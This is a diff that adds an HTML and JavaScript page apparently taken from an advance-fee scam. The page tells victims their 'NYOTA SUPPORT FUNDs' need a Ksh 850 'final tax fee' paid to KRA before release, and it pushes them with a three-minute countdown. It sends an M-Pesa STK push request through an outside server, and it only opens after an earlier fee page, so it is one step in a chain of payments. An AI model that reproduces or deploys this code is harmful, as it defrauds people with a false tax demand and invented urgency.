@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NYOTA FUND – Final Tax Clearance</title>
+<link rel="stylesheet" href="style.css">
+<style>
+/* Countdown timer styling */
+#countdown {
+  font-weight: bold;
+  color: #0a6ebd;
+  font-size: 18px;
+}
+#countdown.urgent { color: red; }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h2>Final Tax Clearance</h2>
+
+  <div class="notice">
+    <strong id="greetingMessage">Congratulations! 🎉</strong><br><br>
+
+    <span id="personalMessage">
+      You're on the right track. To complete the process, you are required to pay a final tax fee of 
+      <strong>Ksh 850</strong> to KRA.  
+      Your <strong>NYOTA SUPPORT FUNDs</strong> are subjected to official taxation.  
+      Complete this step now to fully unlock your funds! 🙌
+    </span>
+
+    <p style="margin-top:15px;">
+      ⏳ Please complete this final step within <span id="countdown">03:00</span> minutes to receive your NYOTA SUPPORT FUNDs without delay.
+    </p>
+  </div>
+
+  <form id="payForm">
+    <input id="phone" placeholder="07XXXXXXXX" required>
+    <button type="submit">Pay Ksh 850 Now</button>
+  </form>
+</div>
+
+<!-- POPUP -->
+<div id="popupOverlay">
+  <div class="popupContent">
+    <h3 id="popupTitle"></h3>
+    <div id="popupSpinner"></div>
+    <p id="popupMessage"></p>
+    <button id="popupBtn">OK</button>
+  </div>
+</div>
+
+<script>
+/* ---- Access protection ---- */
+if(!localStorage.getItem("payment5Completed")){
+  window.location.href="payment5.html";
+}
+
+/* ---- Elements ---- */
+const phone = document.getElementById("phone");
+const popupOverlay = document.getElementById("popupOverlay");
+const popupTitle = document.getElementById("popupTitle");
+const popupSpinner = document.getElementById("popupSpinner");
+const popupMessage = document.getElementById("popupMessage");
+const popupBtn = document.getElementById("popupBtn");
+
+/* ---- Load user data ---- */
+const userPhone = localStorage.getItem("userPhone") || "";
+const userName = localStorage.getItem("userName") || "User";
+const fund = JSON.parse(localStorage.getItem("selectedFund")) || { amount: 0 };
+
+if(userPhone){ phone.value = userPhone; phone.readOnly = true; }
+
+/* ---- Personalized message ---- */
+document.getElementById("greetingMessage").innerText = `Congratulations ${userName}! 🎉`;
+document.getElementById("personalMessage").innerHTML = `
+You're on the right track. To complete the process, you are required to pay a final tax fee of
+<strong>Ksh 850</strong> to KRA.<br>
+Your <strong>NYOTA SUPPORT FUNDs worth Ksh ${fund.amount.toLocaleString()}</strong> are subjected to official taxation.<br>
+Complete this step now to fully unlock your funds! 🙌
+`;
+
+/* ---- Popup helper ---- */
+function showPopup(title, msg="Please wait…", spin=false, ok=false){
+  popupTitle.innerText = title;
+  popupMessage.innerHTML = msg;
+  popupSpinner.innerHTML = spin
+    ? '<div style="width:30px;height:30px;border:4px solid #eee;border-top:4px solid #0a6ebd;border-radius:50%;animation:spin 1s linear infinite"></div>'
+    : '';
+  popupBtn.style.display = ok ? "block" : "none";
+  popupOverlay.style.display = "block";
+}
+popupBtn.onclick = () => popupOverlay.style.display = "none";
+
+/* ---- Countdown timer (3 minutes) ---- */
+let totalSeconds = 3 * 60; // 3 minutes
+const countdownEl = document.getElementById("countdown");
+
+const countdownInterval = setInterval(() => {
+  if(totalSeconds <= 0){
+    clearInterval(countdownInterval);
+    showPopup(
+      "Time Reminder ⏰",
+      "Your NYOTA SUPPORT FUNDs are waiting. Please complete the payment to avoid delays.",
+      false,
+      true
+    );
+    return;
+  }
+
+  const minutes = Math.floor(totalSeconds / 60).toString().padStart(2,"0");
+  const seconds = (totalSeconds % 60).toString().padStart(2,"0");
+  countdownEl.innerText = `${minutes}:${seconds}`;
+
+  // Last 30-second alert
+  if(totalSeconds <= 30){
+    countdownEl.classList.add("urgent");
+    countdownEl.innerText += " ⚡ Hurry up!";
+  }
+
+  totalSeconds--;
+}, 1000);
+
+/* ---- Submit handler ---- */
+document.getElementById("payForm").addEventListener("submit", async e => {
+  e.preventDefault();
+  showPopup("Processing…", "Sending STK push.", true, false);
+
+  try{
+    const res = await fetch("https://optima-server-isaac.onrender.com/pay", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ phone: phone.value, amount: 850, loan_amount: fund.amount })
+    });
+    const data = await res.json();
+    if(!data.success) throw "";
+    pollReceipt(data.reference);
+  } catch {
+    showPopup("Payment Failed ❌", "Unable to initiate payment. Please try again.", false, true);
+  }
+});
+
+/* ---- Receipt polling ---- */
+function pollReceipt(ref){
+  let attempts = 0;
+  const interval = setInterval(async () => {
+    attempts++;
+    if(attempts > 60){
+      clearInterval(interval);
+      showPopup("Still Processing ⏳", "Payment taking longer than expected.", false, true);
+      return;
+    }
+
+    try {
+      const res = await fetch(`https://optima-server-isaac.onrender.com/receipt/${ref}`, { cache: "no-store" });
+      if(!res.ok) return;
+
+      const data = await res.json();
+      const status = (data?.receipt?.status || "").toLowerCase();
+
+      if(status === "pending") return;
+
+      clearInterval(interval);
+
+      if(["success","completed","paid","processing"].includes(status)){
+        localStorage.setItem("payment6Completed","yes");
+
+        showPopup(
+          "Payment Confirmed ✅",
+          "All payments successful. Your NYOTA SUPPORT FUNDs are now fully released!",
+          false,
+          true
+        );
+
+        popupBtn.onclick = () => window.location.href = "success.html";
+        setTimeout(() => window.location.href = "success.html", 3500);
+
+      } else {
+        if(status !== "processing"){
+          showPopup("Payment Failed ❌", data?.receipt?.status_note || "Payment not completed.", false, true);
+        }
+      }
+
+    } catch(err){
+      console.error(err);
+    }
+  }, 5000);
+}
+</script>
+
+</body>
+</html>
